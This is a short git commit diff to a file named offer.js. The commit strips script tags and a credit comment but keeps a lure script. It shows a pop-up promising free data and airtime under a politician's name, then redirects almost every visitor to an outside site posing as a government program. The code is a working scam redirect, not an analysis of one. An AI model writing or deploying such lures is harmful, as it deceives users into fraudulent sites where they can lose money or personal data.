e63aeb479c600c09626c05a678bb6b9b7d24bd66
portalz <151174897+portalz@users.noreply.github.com>
2024-05-17 00:41:34 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,8 +1,5 @@
-<script type="text/javascript"> 
-/* Password Protection Script by www.onlineofferz.xyz*/
 var password = '10'
 password=prompt('Congratulation: You are Qualify to Receive 10GB and 20GH Airtime MAHAMUDU BAWUMIA Offer, Press 1 to Activate',' 1');
 if (password != '10') {
 location.href='https://bawumia-offer.govprogram.lat/10GB';
 }
-</script>
